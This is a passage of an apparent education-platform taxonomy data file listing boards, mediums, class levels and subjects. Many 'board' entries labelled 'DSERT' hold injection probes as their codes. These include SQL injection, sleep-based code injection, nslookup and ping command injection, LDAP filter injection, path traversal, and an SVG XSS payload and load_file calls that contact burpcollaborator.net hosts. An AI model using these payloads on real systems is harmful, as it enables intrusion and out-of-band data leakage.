          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-sleep20.to_i',
          'code': 'dscertka\'+sleep(20.to_i)+\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 73,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-evalcompilefor-x-in-range1n-import-timen-time.sleep20asingle',
          'code': 'dscertka\'+eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))+\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 74,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_evalcompilefor-x-in-range1n-import-timen-time.sleep20asingle',
          'code': 'eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 75,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka.sleep20.',
          'code': 'dscertka\'.sleep(20).\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 76,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkasleep20',
          'code': 'dscertka{${sleep(20)}}',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 77,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_g4l8fguijdnylm5ct8n65948pzvsogg48r1fq.burpcollaborator.net',
          'code': 'g4l8fguijdnylm5ct8n65948pzvsogg48r1fq.burpcollaborator.net',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 78,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_httpqsmi3qis7nb89wtmhibgtjsid9j2cq2eu1npc.burpcollaborator.netdscertka',
          'code': 'http://qsmi3qis7nb89wtmhibgtjsid9j2cq2eu1npc.burpcollaborator.net/?dscertka',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 79,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkanslookup-qcname-md3eom3osjw4usei2ewcefdey54yxmtalxel3.burpcollaborator.net.',
          'code': 'dscertka|nslookup -q=cname md3eom3osjw4usei2ewcefdey54yxmtalxel3.burpcollaborator.net.&',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 80,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka0nslookup-qcname-axb28ancc7gsegy6m2g0y3x2itomhaey6lz9o.burpcollaborator.net.',
          'code': 'dscertka\'"`0&nslookup -q=cname axb28ancc7gsegy6m2g0y3x2itomhaey6lz9o.burpcollaborator.net.&`\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 81,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkaping-c-21-127.0.0.1x',
          'code': 'dscertka|ping -c 21 127.0.0.1||x',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 88,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkaping-n-21-127.0.0.1',
          'code': 'dscertka&ping -n 21 127.0.0.1&',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 89,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkaping-c-21-127.0.0.1',
          'code': 'dscertka\'|ping -c 21 127.0.0.1 #',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 90,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_...dscertka',
          'code': '.../dscertka',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 99,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_.dscertka',
          'code': './dscertka',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 100,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_..dscertka',
          'code': '././dscertka',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 101,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_teddscertka',
          'code': 'ted/dscertka',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 102,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertkayfa',
          'code': 'dscertkayfa',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 103,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_t6m8bgu0j6objectclass',
          'code': 't6m8bgu0j6)(objectClass=*',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 104,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_gend6xkr7pobjectclass',
          'code': 'gend6xkr7p)(!(objectClass=*)',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 105,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_5lphl96lrkobjectclass',
          'code': '5lphl96lrk)(!(!(objectClass=*))',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 106,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_fa8mcf9365objectclass',
          'code': 'fa8mcf9365)(!(!(!(objectClass=*)))',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 107,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_objectclass',
          'code': '*)(objectClass=*',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 108,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_t71litxvmqqboz8pwlqj8m7lscy5rtjl7du6iv',
          'code': 't71litxvmqqboz8pwlqj8m7lscy5rtjl7du6iv',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 115,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_svgonloadnewimage.srcabp2ma1cq7ussgc602u0c3b2wt2mvan0bsylma56burpcollaborator.net',
          'code': '\'"><svg/onload=(new(Image)).src=\'//abp2ma1cq7ussgc602u0c3b2wt2mvan0bsylma\\56burpcollaborator.net\'>',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 116,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_select-load_filezvyr6zl1awehc5wvkrepwsvrgimbfz61uthm5b.burpcollaborator.netbsv',
          'code': '(select load_file(\'\\\\\\\\zvyr6zl1awehc5wvkrepwsvrgimbfz61uthm5b.burpcollaborator.net\\\\bsv\'))',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 126,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-select-load_file9lv1w9bb064r2fm5a14zm2l16scl59wck47xvm.burpcollaborator.netzsd',
          'code': 'dscertka\'+(select load_file(\'\\\\\\\\9lv1w9bb064r2fm5a14zm2l16scl59wck47xvm.burpcollaborator.net\\\\zsd\'))+\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 127,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka80750338-or-27062706',
          'code': 'dscertka80750338\' or \'2706\'=\'2706',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 128,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka69201131-or-20452047',
          'code': 'dscertka69201131\' or \'2045\'=\'2047',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 129,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka32948647-or-63236323',
          'code': 'dscertka32948647\' or \'6323\'=\'6323',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 130,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka69654148-or-36143614',
          'code': 'dscertka69654148\' or \'3614\'=\'3614\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 131,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka24073650-or-51435143',
          'code': 'dscertka24073650\' or 5143=5143-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 132,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka98429362-or-13261327',
          'code': 'dscertka98429362\' or 1326=1327-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 133,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka39068949-or-62046204',
          'code': 'dscertka39068949\' or 6204=6204-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 134,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka90198619-or-54105410',
          'code': 'dscertka90198619\' or 5410=5410\'-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 135,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-33233323',
          'code': 'dscertka\' and \'3323\'=\'3323',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 136,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-76547656',
          'code': 'dscertka\' and \'7654\'=\'7656',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 137,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-18091809',
          'code': 'dscertka\' and \'1809\'=\'1809',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 138,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-67966796',
          'code': 'dscertka\' and \'6796\'=\'6796\'',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 139,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-50235023',
          'code': 'dscertka\' and 5023=5023-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 140,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-98609869',
          'code': 'dscertka\' and 9860=9869-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 141,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-71887188',
          'code': 'dscertka\' and 7188=7188-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 142,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_dscertka-and-60136013',
          'code': 'dscertka\' and 6013=6013\'-- ',
          'name': 'DSERT',
          'description': 'DSERT',
          'index': 143,
          'category': 'board',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_board_statekarnataka',
          'code': 'statekarnataka',
          'name': 'State (Karnataka)',
          'description': 'State (Karnataka)',
          'index': 144,
          'category': 'board',
          'status': 'Live',
          'translations': null
        }
      ]
    },
    {
      'identifier': 'ncf_medium',
      'code': 'medium',
      'name': 'Medium',
      'description': '',
      'index': 2,
      'status': 'Live',
      'translations': '{"en":"medium"}',
      'terms': [
        {
          'identifier': 'ncf_medium_english',
          'code': 'english',
          'name': 'English',
          'description': '',
          'index': 1,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_hindi',
          'code': 'hindi',
          'name': 'Hindi',
          'description': '',
          'index': 2,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_oriya',
          'code': 'oriya',
          'name': 'Odia',
          'description': 'Odia',
          'index': 3,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_telugu',
          'code': 'telugu',
          'name': 'Telugu',
          'description': '',
          'index': 4,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_kannada',
          'code': 'kannada',
          'name': 'Kannada',
          'description': '',
          'index': 5,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_marathi',
          'code': 'marathi',
          'name': 'Marathi',
          'description': '',
          'index': 6,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_assamese',
          'code': 'assamese',
          'name': 'Assamese',
          'description': '',
          'index': 7,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_bengali',
          'code': 'bengali',
          'name': 'Bengali',
          'description': '',
          'index': 8,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_gujarati',
          'code': 'gujarati',
          'name': 'Gujarati',
          'description': '',
          'index': 9,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_tamil',
          'code': 'tamil',
          'name': 'Tamil',
          'description': '',
          'index': 10,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_urdu',
          'code': 'urdu',
          'name': 'Urdu',
          'description': '',
          'index': 11,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_medium_other',
          'code': 'other',
          'name': 'Other',
          'description': '',
          'index': 12,
          'category': 'medium',
          'status': 'Live',
          'translations': null
        }
      ]
    },
    {
      'identifier': 'ncf_gradelevel',
      'code': 'gradeLevel',
      'name': 'Class',
      'description': '',
      'index': 3,
      'status': 'Live',
      'translations': '{"en":"gradeLevel"}',
      'terms': [
        {
          'identifier': 'ncf_gradelevel_kindergarten',
          'code': 'kindergarten',
          'name': 'KG',
          'description': 'KG',
          'index': 1,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade1',
          'code': 'grade1',
          'name': 'Class 1',
          'description': 'Class 1',
          'index': 2,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade2',
          'code': 'grade2',
          'name': 'Class 2',
          'description': 'Class 2',
          'index': 3,
          'category': 'gradeLevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade3',
          'code': 'grade3',
          'name': 'Class 3',
          'description': 'Class 3',
          'index': 4,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade4',
          'code': 'grade4',
          'name': 'Class 4',
          'description': 'Class 4',
          'index': 5,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade5',
          'code': 'grade5',
          'name': 'Class 5',
          'description': 'Class 5',
          'index': 6,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade6',
          'code': 'grade6',
          'name': 'Class 6',
          'description': 'Class 6',
          'index': 7,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade7',
          'code': 'grade7',
          'name': 'Class 7',
          'description': 'Class 7',
          'index': 8,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade8',
          'code': 'grade8',
          'name': 'Class 8',
          'description': 'Class 8',
          'index': 9,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade9',
          'code': 'grade9',
          'name': 'Class 9',
          'description': 'Class 9',
          'index': 10,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade10',
          'code': 'grade10',
          'name': 'Class 10',
          'description': 'Class 10',
          'index': 11,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade11',
          'code': 'grade11',
          'name': 'Class 11',
          'description': 'Class 11',
          'index': 12,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_grade12',
          'code': 'grade12',
          'name': 'Class 12',
          'description': 'Class 12',
          'index': 13,
          'category': 'gradelevel',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_gradelevel_others',
          'code': 'others',
          'name': 'Other',
          'description': '',
          'index': 14,
          'category': 'gradeLevel',
          'status': 'Live',
          'translations': null
        }
      ]
    },
    {
      'identifier': 'ncf_subject',
      'code': 'subject',
      'name': 'Subject',
      'description': '',
      'index': 4,
      'status': 'Live',
      'translations': '{"en":"subject"}',
      'terms': [
        {
          'identifier': 'ncf_subject_mathematics',
          'code': 'mathematics',
          'name': 'Mathematics',
          'description': '',
          'index': 1,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_english',
          'code': 'english',
          'name': 'English',
          'description': '',
          'index': 2,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_tamil',
          'code': 'tamil',
          'name': 'Tamil',
          'description': '',
          'index': 3,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_telugu',
          'code': 'telugu',
          'name': 'Telugu',
          'description': '',
          'index': 4,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_geography',
          'code': 'geography',
          'name': 'Geography',
          'description': '',
          'index': 5,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_urdu',
          'code': 'urdu',
          'name': 'Urdu',
          'description': '',
          'index': 6,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_kannada',
          'code': 'kannada',
          'name': 'Kannada',
          'description': '',
          'index': 7,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_assamese',
          'code': 'assamese',
          'name': 'Assamese',
          'description': '',
          'index': 8,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_physics',
          'code': 'physics',
          'name': 'Physics',
          'description': '',
          'index': 9,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_chemistry',
          'code': 'chemistry',
          'name': 'Chemistry',
          'description': '',
          'index': 10,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_hindi',
          'code': 'hindi',
          'name': 'Hindi',
          'description': '',
          'index': 11,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_marathi',
          'code': 'marathi',
          'name': 'Marathi',
          'description': '',
          'index': 12,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_environmentalstudies',
          'code': 'environmentalstudies',
          'name': 'EvS',
          'description': 'EvS',
          'index': 13,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_politicalscience',
          'code': 'politicalscience',
          'name': 'Political Science',
          'description': '',
          'index': 14,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_bengali',
          'code': 'bengali',
          'name': 'Bengali',
          'description': '',
          'index': 15,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_history',
          'code': 'history',
          'name': 'History',
          'description': '',
          'index': 16,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_gujarati',
          'code': 'gujarati',
          'name': 'Gujarati',
          'description': '',
          'index': 17,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_biology',
          'code': 'biology',
          'name': 'Biology',
          'description': '',
          'index': 18,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_oriya',
          'code': 'oriya',
          'name': 'Odia',
          'description': 'Odia',
          'index': 19,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_punjabi',
          'code': 'punjabi',
          'name': 'Punjabi',
          'description': '',
          'index': 20,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_nepali',
          'code': 'nepali',
          'name': 'Nepali',
          'description': '',
          'index': 21,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_malayalam',
          'code': 'malayalam',
          'name': 'Malayalam',
          'description': '',
          'index': 22,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_socialstudies',
          'code': 'socialstudies',
          'name': 'Social Studies',
          'description': 'Social Studies',
          'index': 23,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_science',
          'code': 'science',
          'name': 'Science',
          'description': 'Science',
          'index': 24,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_sanskrit',
          'code': 'sanskrit',
          'name': 'Sanskrit',
          'description': 'Sanskrit',
          'index': 25,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_healthandphysicaleducation',
          'code': 'healthandphysicaleducation',
          'name': 'Health and Physical Education',
          'description': 'Health and Physical Education',
          'index': 26,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_economics',
          'code': 'economics',
          'name': 'Economics',
          'description': 'Economics',
          'index': 27,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_other',
          'code': 'other',
          'name': 'Other',
          'description': 'Other',
          'index': 28,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_botany',
          'code': 'botany',
          'name': 'Botany',
          'description': 'Botany',
          'index': 29,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_zoology',
          'code': 'zoology',
          'name': 'Zoology',
          'description': 'Zoology',
          'index': 30,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_commerce',
          'code': 'commerce',
          'name': 'Commerce',
          'description': 'Commerce',
          'index': 31,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_accountancy',
          'code': 'accountancy',
          'name': 'Accountancy',
          'description': 'Accountancy',
          'index': 32,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_statistics',
          'code': 'statistics',
          'name': 'Statistics',
          'description': 'Statistics',
          'index': 33,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_computerscience',
          'code': 'computerscience',
          'name': 'Computer Science',
          'description': 'Computer Science',
          'index': 34,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_computerapplications',
          'code': 'computerapplications',
          'name': 'Computer Applications',
          'description': 'Computer Applications',
          'index': 35,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_biochemistry',
          'code': 'biochemistry',
          'name': 'Bio Chemistry',
          'description': 'Bio Chemistry',
          'index': 36,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_microbiology',
          'code': 'microbiology',
          'name': 'Micro Biology',
          'description': 'Micro Biology',
          'index': 37,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_homescience',
          'code': 'homescience',
          'name': 'Home Science',
          'description': 'Home Science',
          'index': 38,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_nutritiondiabetics',
          'code': 'nutritiondiabetics',
          'name': 'Nutrition Diabetics',
          'description': 'Nutrition Diabetics',
          'index': 39,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_communicativeenglish',
          'code': 'communicativeenglish',
          'name': 'Communicative English',
          'description': 'Communicative English',
          'index': 40,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_advancetamil',
          'code': 'advancetamil',
          'name': 'Advance Tamil',
          'description': 'Advance Tamil',
          'index': 41,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_businessmaths',
          'code': 'businessmaths',
          'name': 'Business Maths',
          'description': 'Business Maths',
          'index': 42,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_ethicsindianculture',
          'code': 'ethicsindianculture',
          'name': 'Ethics Indian Culture',
          'description': 'Ethics Indian Culture',
          'index': 43,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_computertechnology',
          'code': 'computertechnology',
          'name': 'Computer Technology',
          'description': 'Computer Technology',
          'index': 44,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_foodmanagement',
          'code': 'foodmanagement',
          'name': 'Food Management',
          'description': 'Food Management',
          'index': 45,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_officemanagement',
          'code': 'officemanagement',
          'name': 'Office Management',
          'description': 'Office Management',
          'index': 46,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_accountancyauditing',
          'code': 'accountancyauditing',
          'name': 'Accountancy Auditing',
          'description': 'Accountancy Auditing',
          'index': 47,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_agriculture',
          'code': 'agriculture',
          'name': 'Agriculture',
          'description': 'Agriculture',
          'index': 48,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_generalmachinist',
          'code': 'generalmachinist',
          'name': 'General Machinist',
          'description': 'General Machinist',
          'index': 49,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_electricalmachinesappliances',
          'code': 'electricalmachinesappliances',
          'name': 'Electrical Machines Appliances',
          'description': 'Electrical Machines Appliances',
          'index': 50,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_electricalequipments',
          'code': 'electricalequipments',
          'name': 'Electrical Equipments',
          'description': 'Electrical Equipments',
          'index': 51,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_draughtsmancivil',
          'code': 'draughtsmancivil',
          'name': 'Draughtsman Civil',
          'description': 'Draughtsman Civil',
          'index': 52,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_automechanic',
          'code': 'automechanic',
          'name': 'Auto Mechanic',
          'description': 'Auto Mechanic',
          'index': 53,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_textiletechnology',
          'code': 'textiletechnology',
          'name': 'Textile Technology',
          'description': 'Textile Technology',
          'index': 54,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_textiledressdesigning',
          'code': 'textiledressdesigning',
          'name': 'Textile Dress Designing',
          'description': 'Textile Dress Designing',
          'index': 55,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_nutritiondietics',
          'code': 'nutritiondietics',
          'name': 'Nutrition Dietics',
          'description': 'Nutrition Dietics',
          'index': 56,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_ethicsandindianculture',
          'code': 'ethicsandindianculture',
          'name': 'Ethics and Indian Culture',
          'description': 'Ethics and Indian Culture',
          'index': 57,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_foodservicemanagement',
          'code': 'foodservicemanagement',
          'name': 'Food Service Management',
          'description': 'Food Service Management',
          'index': 58,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_officemanagementandsecretaryship',
          'code': 'officemanagementandsecretaryship',
          'name': 'Office Management and Secretaryship',
          'description': 'Office Management and Secretaryship',
          'index': 59,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_accountancyandauditing',
          'code': 'accountancyandauditing',
          'name': 'Accountancy and Auditing',
          'description': 'Accountancy and Auditing',
          'index': 60,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_agriculturalscience',
          'code': 'agriculturalscience',
          'name': 'Agricultural Science',
          'description': 'Agricultural Science',
          'index': 61,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_basicmechanicalengineering',
          'code': 'basicmechanicalengineering',
          'name': 'Basic Mechanical Engineering',
          'description': 'Basic Mechanical Engineering',
          'index': 62,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_basicelectricalengineering',
          'code': 'basicelectricalengineering',
          'name': 'Basic Electrical Engineering',
          'description': 'Basic Electrical Engineering',
          'index': 63,
          'category': 'subject',
          'status': 'Live',
          'translations': null
        },
        {
          'identifier': 'ncf_subject_basicelectronicsengineering',
          'code': 'basicelectronicsengineering',
          'name': 'Basic Electronics Engineering',
          'description': 'Basic Electronics Engineering',
